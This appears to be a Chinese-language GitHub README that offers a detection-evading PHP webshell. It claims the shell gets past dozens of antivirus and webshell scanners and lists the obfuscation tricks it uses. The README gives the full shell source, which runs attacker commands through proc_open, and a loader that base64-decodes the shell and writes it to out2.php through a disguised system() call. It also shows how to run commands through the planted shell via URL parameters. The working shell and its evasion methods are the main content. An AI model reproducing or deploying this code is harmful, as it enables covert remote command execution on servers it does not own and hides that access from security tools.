# php-webshell-bypass
> 前段时间上班无聊，刷公众号偶然发现一篇“<a href=https://github.com/icewolf-sec/PerlinPuzzle-Webshell-PHP>原神免杀</a>”的文章，突然来了兴趣研究研究，找了曾哥的<a href=https://blog.zgsec.cn/archives/197.html>webshell免杀手册</a>来看。自己做了几个样本，效果测试还不错，就放出来和大家交流，感觉基本够用。

截止2月6日
### 免杀效果：
**免杀成功**：绕过成功：阿里伏魔引擎、安恒云沙箱、河马WebShell查杀、魔盾云沙箱、微步集成引擎共26个（微软、卡巴斯基、IKARUS、Avast、GDATA、安天、360、NANO、瑞星、Sophos、WebShell专杀、MicroAPT、OneStatic、ESET、小红伞、大蜘蛛、AVG、K7、江民、Baidu、TrustBook、熊猫、ClamAV、Baidu-China、OneAV、MicroNonPE）、D盾、Windows Defender、火绒安全软件

**免杀失败**：长亭百川WebShell查杀引擎
**解决方案**：通过webshell加载器进行绕过，实战中不知道是否可行。（可能要加入不死马机制？）

使用的免杀手法
- 入口函数限制
- 替换变量名
- base64加密字符串
- proc_open执行命令
- 类调用绕过
- 注释绕过
- 加载器

本体.php
```php
  
<?php  
function GMigF(){  
    return chr(1078/11)/* qChxU h JsC*/.chr(970/10).chr(1725/15).chr(1616/16).chr(270/5).chr(520/10).chr(665/7).chr(1100/11).chr(1414/14).chr(1485/15).chr(1554/14).chr(600/6).chr(1515/15);  
}  
$tkhSr = GMigF();  
  
function test(){  
    return extract($_GET);  
}  
  
  
class Gw0O6U55 {  
    public $dKd;  
    public function __construct($H5Hm8){  
        $this->dKd="/*Z871A24vf4*/".$H5Hm8."/*Z871A24vf4*/";  
    }  
}  
  
if (test()){  
    $auPtVEeJgC=new Gw0O6U55($_REQUEST[$tkhSr('MQ==')]);  
    $LPMeYBR=substr($auPtVEeJgC ->dKd,14,-14);  
}  
  
  
$VEIlAcb =[  
    0 => [$tkhSr('cGlwZQ=='), $tkhSr('cg==')],  
    1 => [$tkhSr('cGlwZQ=='), $tkhSr('dw==')],  
    2 => [$tkhSr('cGlwZQ=='), $tkhSr('dw==')],  
];  
  
$qwVrFISA = proc_open($LPMeYBR, $VEIlAcb,$pipes);  
  
if (is_resource($qwVrFISA)){  
    $shqeo = stream_get_contents($pipes[1]);  
  
    fclose($pipes[0]);  
    fclose($pipes[1]);  
    fclose($pipes[2]);  
    proc_close($qwVrFISA);  
  
    echo $shqeo;  
}
```


加载器
```php
<?php  
$hahaha = strtr("abatme","me","em");  
$wahaha = strtr($hahaha,"ab","sy");  
$gogogo = strtr('echo "Cjw/cGhwCmZ1bmN0aW9uIEdNaWdGKCl7CiAgICByZXR1cm4gY2hyKDEwNzgvMTEpLyogcUNoeFUgaCBKc0MqLy5jaHIoOTcwLzEwKS5jaHIoMTcyNS8xNSkuY2hyKDE2MTYvMTYpLmNocigyNzAvNSkuY2hyKDUyMC8xMCkuY2hyKDY2NS83KS5jaHIoMTEwMC8xMSkuY2hyKDE0MTQvMTQpLmNocigxNDg1LzE1KS5jaHIoMTU1NC8xNCkuY2hyKDYwMC82KS5jaHIoMTUxNS8xNSk7Cn0KJHRraFNyID0gR01pZ0YoKTsKCmZ1bmN0aW9uIHRlc3QoKXsKICAgIHJldHVybiBleHRyYWN0KCRfR0VUKTsKfQoKCmNsYXNzIEd3ME82VTU1IHsKICAgIHB1YmxpYyAkZEtkOwogICAgcHVibGljIGZ1bmN0aW9uIF9fY29uc3RydWN0KCRINUhtOCl7CiAgICAgICAgJHRoaXMtPmRLZD0iLypaODcxQTI0dmY0Ki8iLiRINUhtOC4iLypaODcxQTI0dmY0Ki8iOwogICAgfQp9CgppZiAodGVzdCgpKXsKICAgICRhdVB0VkVlSmdDPW5ldyBHdzBPNlU1NSgkX1JFUVVFU1RbJHRraFNyKCdNUT09JyldKTsKICAgICRMUE1lWUJSPXN1YnN0cigkYXVQdFZFZUpnQyAtPmRLZCwxNCwtMTQpOwp9CgoKJFZFSWxBY2IgPVsKICAgIDAgPT4gWyR0a2hTcignY0dsd1pRPT0nKSwgJHRraFNyKCdjZz09JyldLAogICAgMSA9PiBbJHRraFNyKCdjR2x3WlE9PScpLCAkdGtoU3IoJ2R3PT0nKV0sCiAgICAyID0+IFskdGtoU3IoJ2NHbHdaUT09JyksICR0a2hTcignZHc9PScpXSwKXTsKCiRxd1ZyRklTQSA9IHByb2Nfb3BlbigkTFBNZVlCUiwgJFZFSWxBY2IsJHBpcGVzKTsKCmlmIChpc19yZXNvdXJjZSgkcXdWckZJU0EpKXsKICAgICRzaHFlbyA9IHN0cmVhbV9nZXRfY29udGVudHMoJHBpcGVzWzFdKTsKCiAgICBmY2xvc2UoJHBpcGVzWzBdKTsKICAgIGZjbG9zZSgkcGlwZXNbMV0pOwogICAgZmNsb3NlKCRwaXBlc1syXSk7CiAgICBwcm9jX2Nsb3NlKCRxd1ZyRklTQSk7CgogICAgZWNobyAkc2hxZW87Cn0K" |base64 -d > ./out2.php',"","");  
$wahaha($gogogo);
```


### 如何使用：
1. 直接上传本体：
`?c=1&1={cmd}`
如：
`?c=1&1=ls`

2. 使用加载器:
访问加载器后webshell地址在同级目录下的`out2.php`
传参和上文一致。


免杀绕过截图放在下面：

![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202402062233651.png)
![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202402062233652.png)
![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202402062233653.png)
![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202402062233655.png)
![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202402062233656.png)
![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202402062233657.png)
![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202402062233658.png)
![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202402062233659.png)
![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202402062233660.png)
![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202402062233661.png)
![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202402062233662.png)
![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202402062233663.png)
![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202402062233664.png)
![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202402062233665.png)
